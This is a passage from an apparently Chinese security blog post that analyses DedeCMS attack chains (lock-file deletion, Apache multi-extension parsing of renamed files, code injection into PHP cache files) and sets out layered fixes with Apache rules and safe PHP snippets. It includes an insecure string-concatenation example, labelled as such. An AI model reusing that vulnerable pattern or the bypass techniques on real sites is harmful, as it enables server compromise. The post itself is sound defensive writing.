注入端的难度差得很远：一个是偷来的会话，一个是本来就有的账号，一个是会员加管理员两套凭据。但它们后半段是同一件事——**让一个会被 PHP 解析的文件出现在 web 目录里**  
。  
  
更值得看的是最后一行的共性。**三条链打穿的「防护」，性质完全一样，都只是标识：**  
- **一个后缀**  
——VE-0034 的修复建议里写着「把输出改成 .inc  
 或 .txt  
，避免被 PHP 解析」。而 VE-0186 里 member_model.inc  
 从来没被 URL 访问过，它是被 require_once  
 包含进来的——**包含的时候，后缀是什么根本不重要**  
。  
  
- **一个文件名**  
——官方把 module-install.php  
 改成 .bak  
，可 Apache 的多后缀解析让它照样是 PHP。**改名改变的是人们在地址栏里怎么称呼它，不是服务器怎么处理它。**  
  
- **一个锁文件**  
——install_lock.txt  
 的全部作用就是「让 file_exists()  
 返回 true」。文件没了，门就开了——而删它可能只需要一个会员的删文按钮。  
  
🔍 **所以真正的分界线不是「代码危不危险」，而是「它会不会被解析」。**  
后缀、文件名、锁文件，这三样都只影响「它叫什么、在不在」，不影响「服务器会不会执行它」。  
  
判断一个写入点危不危险，别问文件叫什么，问**写完谁会解析它**  
。前者是人定的，后者是配置定的——而配置通常比人诚实。  
## 七、修复：从「藏文件」到「别拼代码」  
  
分三层，按「能不能马上做」排。  
### 第一层：立刻能做的收敛  
1. **关掉目录列表**  
——Options -Indexes  
，或者在 /data/  
 下放一个空的 index.html。这是 VE-0034 的起点。  
  
1. **把 session 移出 web 根目录**  
——session.save_path  
 指到 /var/lib/php/sessions  
 这类位置，别留在站点目录里。  
  
1. **给敏感子目录加拒绝规则**  
——sessions_*  
、cache/  
、backupdata/  
 一律拒绝。  
  
1. **装完就把 /install/ 整个目录删掉**  
——不是改名，也不是只留一把锁。实在不敢删，就用 Web 服务器让它 404，这比依赖 PHP 里的 file_exists()  
 硬得多。  
  
Apache 配置  
  
  
# 1) 正向白名单：只认 .php 结尾，别去猜其它后缀  
  
<FilesMatch "\.php$">  
  
    SetHandler application/x-httpd-php  
  
</FilesMatch>  
  
  
# 2) 目录层面直接 404，比锁文件可靠  
  
RedirectMatch 404 ^/install/  
  
  
<Directory /var/www/html/data>  
  
    Options -Indexes  
  
    <DirectoryMatch "sessions_.*|cache|backupdata">  
  
        Require all denied  
  
    </DirectoryMatch>  
  
</Directory>  
  
### 第二层：根因——不要用字符串拼 PHP 代码  
  
这是唯一真正治根的一步。生成配置缓存时，不要手写 fwrite("...array('{$x}')...")  
，让 PHP 自己去负责转义：  
  
用 var_export 代替手拼  
  
  
// 不安全：值直接进代码，引号全靠运气  
  
fwrite($fp, "\$_MemberMod[{$row->id}]=array('{$row->name}','{$row->table}');\r\n");  
  
  
// 安全：值交给 var_export 转义，写出来的永远是字面量  
  
$line = sprintf('$_MemberMod[%d]=%s;' . "\r\n",  
  
                (int)$row->id,  
  
                var_export(array($row->name, $row->table), true));  
  
fwrite($fp, $line);  
  
  
同样的道理，如果一定要自己拼，就要**按目标上下文转义**  
：往 PHP 字符串里塞值用 var_export($v, true)  
；往 SQL 里塞值用预处理语句而不是 addslashes  
；往 HTML 里塞值用 htmlspecialchars  
。转义函数和上下文是一一对应的，串着用等于没用。  
  
还有 VE-0182 那一课：**凡是「从内容里提路径、再操作文件」的地方，都要 realpath() 加前缀校验**  
，而不是拼完直接删。  
  
DelArc 的正确写法  
  
  
$real = realpath(DEDEROOT . $var);          // 先把 .. 解析掉  
  
$base = realpath(DEDEROOT . 'uploads');     // 允许的边界  
  
  
if ($real === false || strpos($real, $base . DIRECTORY_SEPARATOR) !== 0) {  
  
    continue;                                // 越界就跳过，绝不 unlink  
  
}  
  
@unlink($real);  
  
### 第三层：把「不该出现的值」拦在入口  
  
table  
 字段本来就只该是 dede_member_person  
 这种标识符，一条白名单正则就够了：  
  
输入校验  
  
  
if (!preg_match('/^[a-z0-9_]{1,30}$/i', $table)) {  
  
    die('member model table is invalid');  
  
}  
  
  
这类校验的价值不在于「挡住聪明人」，而在于**把攻击者从「拼代码」这条路上赶走**  
——只要值里不能出现引号、分号、括号，注入的语法基础就不存在了。  
### 还有一层：把这类文件当代码来监控  
  
/data/cache/  
 和 /install/  
 下的东西，要么是「程序生成的、内容稳定」，要么是「装完就该不存在的」。所以它们的哈希发生非预期变化，或者 /dede/  
 下突然多出一个 .php  
——都是极强、极少误报的信号。把它们纳入文件完整性监控（FIM），会发现得比日志里冒出一个异常请求早得多。  
## 写在最后  
1. **缓存文件不是数据，是代码。**  
一个文件只要会被 include 或 require，它的扩展名、它所在的目录、它「看起来像配置文件」，都不影响它是代码这件事。判断一个写入点危不危险，看的是「写完之后谁会解析它」。  
  
1. **靠名字做的防护，都是纸做的。**  
改名 .bak  
、改后缀 .inc  
、放一个 lock  
 文件，这三件事的共同点是：**它们都不改变「服务器会不会执行这段内容」，只改变「它叫什么、在不在」**  
。要挡住执行，就得在「会不会被解析」这一层动手——删掉目录、正向白名单、RedirectMatch 404  
。  
  
1. **转义是动词，不是形容词。**  
「我们做了转义」这句话没有意义，有意义的是「我们在 PHP 上下文里做了 PHP 转义」。同一个字符串穿过 SQL 再进 PHP，就得转两次；少一次，前面那次白做。  
  
1. **链的长度和危险程度没关系。**  
VE-0034 有三步，每一步都零权限，所以是 Critical；VE-0186 只有一步，但那一步卡在「要 admin」，所以只算 7.2；VE-0182 绕了六步，卡在「admin 备料」。评价一条链，看断点在哪，不看它绕了几圈。  
  
1. **默认配置就是默认风险。**  
目录列表开着、session 放在 web 根下、装完不删 /install/  
、admin/admin123 没改——这四件事单独看都像「图省事」，叠在一起就是一条完整的链。  
  
最后一句：这类老系统的问题，很多不是「写错了」，而是「当年这么写是对的」。PHP 5 时代把配置写成 PHP 文件是性能优化，把 session 放 web 目录是省事，装完留个锁文件是体贴，开目录列表是方便调试。十几年后这些「对的做法」成了教科书级的坑——修它们，本质上是在还技术债，不是抓 Bug。  
  
觉得有收获？  
  
点个「在看」和「赞」，顺手查一下你们还在跑的织梦站 👇  
  
四个地方：/data/  
 能不能直接打开、session 在不在 web 目录里、/install/  
 删没删、后台密码是不是还在用默认值。  
#   
  
